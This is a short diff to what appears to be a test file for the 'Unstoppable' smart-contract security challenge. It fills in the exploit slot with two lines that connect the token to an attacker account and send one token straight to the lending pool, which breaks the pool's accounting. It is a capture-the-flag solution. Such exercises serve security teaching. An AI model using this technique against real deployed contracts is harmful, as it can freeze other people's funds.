@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const connected = await this.token.connect(attacker)
+        await connected.transfer(this.pool.address, 1)
     });
 
     after(async function () {
